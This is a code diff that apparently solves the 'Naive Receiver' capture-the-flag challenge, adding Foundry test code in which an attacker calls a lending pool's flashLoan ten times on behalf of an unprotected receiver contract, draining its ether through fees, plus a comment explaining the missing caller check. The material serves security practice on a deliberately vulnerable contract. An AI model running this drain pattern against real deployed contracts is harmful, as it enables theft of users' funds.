@@ -48,7 +48,11 @@ contract NaiveReceiver is Test {
         /**
          * EXPLOIT START *
          */
-
+        vm.startPrank(attacker);
+        for (uint256 i = 0; i < 10; i++) {
+            naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 1e18);
+        }
+        vm.stopPrank();
         /**
          * EXPLOIT END *
          */
@@ -62,3 +66,6 @@ contract NaiveReceiver is Test {
         assertEq(address(naiveReceiverLenderPool).balance, ETHER_IN_POOL + ETHER_IN_RECEIVER);
     }
 }
+
+// Exploit Explanation: receiveEther function in FlashLoanReceiver contract is not checking if the msg.sender is the owner of the contract.
+// So anyone can call this function and drain the contract balance. Through this attacker can make the contract to repay the loan to the lender pool.
